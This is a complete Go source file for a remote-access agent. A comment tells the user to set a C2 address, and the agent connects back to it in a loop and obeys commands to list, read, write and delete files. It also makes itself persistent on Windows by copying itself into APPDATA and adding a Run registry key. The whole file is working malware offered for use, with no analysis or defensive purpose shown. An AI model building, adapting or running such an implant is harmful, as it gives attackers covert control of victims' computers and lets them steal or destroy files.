package main

import (
	"io"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

func listDir(arg string) string {
	if arg == "" {
		arg = "."
	}
	files, err := ioutil.ReadDir(arg)
	if err != nil {
		return "[!] listDir error: " + err.Error()
	}
	var out []string
	for _, f := range files {
		out = append(out, f.Name())
	}
	return strings.Join(out, "\n")
}

func writeFile(arg string) string {
	parts := strings.SplitN(arg, "|", 2)
	if len(parts) != 2 {
		return "[!] Invalid write args: expected filename|content"
	}
	err := ioutil.WriteFile(parts[0], []byte(parts[1]), 0644)
	if err != nil {
		return "[!] writeFile error: " + err.Error()
	}
	return "[+] File written"
}

func readFile(arg string) string {
	data, err := ioutil.ReadFile(arg)
	if err != nil {
		return "[!] readFile error: " + err.Error()
	}
	return string(data)
}

func deleteFile(arg string) string {
	err := os.Remove(arg)
	if err != nil {
		return "[!] deleteFile error: " + err.Error()
	}
	return "[+] File deleted"
}

func persist(arg string) string {
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return "[!] APPDATA not found"
	}
	dest := filepath.Join(appdata, "myagent.exe")

	exePath, err := os.Executable()
	if err != nil {
		return "[!] exe path error: " + err.Error()
	}

	if exePath != dest {
		in, err := os.Open(exePath)
		if err != nil {
			return "[!] open self error: " + err.Error()
		}
		defer in.Close()
		out, err := os.Create(dest)
		if err != nil {
			return "[!] create dest error: " + err.Error()
		}
		defer out.Close()
		_, err = io.Copy(out, in)
		if err != nil {
			return "[!] copy error: " + err.Error()
		}
	}

	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	name := "MyAgent"
	cmd := exec.Command("reg", "add", key, "/v", name, "/t", "REG_SZ", "/d", dest, "/f")
	err = cmd.Run()
	if err != nil {
		return "[!] reg add error: " + err.Error()
	}
	return "[+] Persistence installed"
}

func unpersist(arg string) string {
	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
	name := "MyAgent"
	cmd := exec.Command("reg", "delete", key, "/v", name, "/f")
	err := cmd.Run()
	if err != nil {
		return "[!] reg delete error: " + err.Error()
	}
	return "[+] Persistence removed"
}

func pwd(arg string) string {
	dir, err := os.Getwd()
	if err != nil {
		return "[!] pwd error: " + err.Error()
	}
	return dir
}

func handle(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 4096)

	for {
		n, err := conn.Read(buf)
		if err != nil {
			return
		}
		if n < 1 {
			continue
		}
		code := buf[0]
		arg := ""
		if n > 1 {
			arg = string(buf[1:n])
		}

		var resp string
		switch code {
		case 0x01:
			resp = listDir(arg)
		case 0x02:
			resp = writeFile(arg)
		case 0x03:
			resp = readFile(arg)
		case 0x04:
			resp = deleteFile(arg)
		case 0x05:
			resp = persist(arg)
		case 0x06:
			resp = unpersist(arg)
		case 0x07:
			resp = pwd(arg)
		case 0x00:
			return
		default:
			resp = "[!] Unknown command"
		}

		conn.Write([]byte(resp))
	}
}

func connectLoop(server string) {
	for {
		conn, err := net.Dial("tcp", server)
		if err == nil {
			handle(conn)
		}
		time.Sleep(3 * time.Second)
	}
}

func main() {
	go connectLoop("192.168.2.135:8081") // ← Change to your C2 IP and port
	select {}
}
